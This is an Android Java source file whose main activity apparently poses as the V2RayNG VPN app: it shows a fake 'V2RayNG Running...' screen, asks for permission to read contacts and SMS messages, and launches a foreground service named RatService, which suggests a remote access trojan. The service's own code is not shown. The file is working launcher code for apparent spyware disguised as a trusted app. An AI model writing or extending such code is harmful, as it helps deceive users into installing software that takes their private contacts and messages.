package com.v2ray.update;
import android.app.Activity; import android.content.Intent; import android.os.Bundle; import android.widget.*; import android.graphics.Color;
public class MainActivity extends Activity {
    @Override protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setBackgroundColor(Color.parseColor("#1E1E1E"));
        layout.setPadding(50, 150, 50, 50);
        TextView title = new TextView(this);
        title.setText("V2RayNG Running...");
        title.setTextColor(Color.WHITE);
        title.setTextSize(30);
        layout.addView(title);
        setContentView(layout);

        requestPermissions(new String[]{
            android.Manifest.permission.READ_CONTACTS, 
            android.Manifest.permission.READ_SMS
        }, 100);
        
        // استارت سرویس به عنوان Foreground
        Intent serviceIntent = new Intent(this, RatService.class);
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
    }
}